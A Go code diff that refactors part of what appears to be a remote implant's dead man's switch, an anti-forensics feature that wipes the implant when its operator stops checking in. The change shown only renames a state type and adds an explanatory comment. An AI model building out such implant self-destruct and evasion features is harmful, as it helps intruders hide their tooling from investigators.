@@ -824,27 +824,31 @@ func forensicDeadman() string {
 	return filepath.Join(forensicStateDir(), "deadman.state")
 }
 
-// forensicDeadmanState is the state of the switch.
-type forensicDeadmanState struct {
+// deadmanState is the state of the switch.
+//
+// The type and the reader cannot share a name: Go keeps types and
+// functions in one namespace, and the name of the reader is what the
+// callers already say.
+type deadmanState struct {
 	deadline int64
 	minutes  uint64
 }
 
 // forensicDeadmanState reads the state of the switch.
-func forensicDeadmanState() (forensicDeadmanState, bool) {
+func forensicDeadmanState() (deadmanState, bool) {
 	data, err := os.ReadFile(forensicDeadman())
 	if err != nil {
-		return forensicDeadmanState{}, false
+		return deadmanState{}, false
 	}
 	parts := strings.SplitN(strings.TrimSpace(string(data)), "|", 2)
 	if len(parts) != 2 {
-		return forensicDeadmanState{}, false
+		return deadmanState{}, false
 	}
 	minutes, err := strconv.ParseUint(parts[1], 10, 64)
 	if err != nil {
-		return forensicDeadmanState{}, false
+		return deadmanState{}, false
 	}
-	return forensicDeadmanState{deadline: parseInt64(parts[0]), minutes: minutes}, true
+	return deadmanState{deadline: parseInt64(parts[0]), minutes: minutes}, true
 }
 
 // forensicDeadmanArm arms the dead man's switch.
@@ -877,7 +881,7 @@ func forensicDeadmanArm(args map[string]any) (string, map[string]any, error) {
 	}
 	return fmt.Sprintf("wipe.deadman: the implant ends itself if the operator does not check in for %d minutes\n", minutes),
 		map[string]any{
-			"wipe_deadman":         int64(minutes),
+			"wipe_deadman":          int64(minutes),
 			"wipe_deadman_deadline": deadline / 1000,
 		}, nil
 }
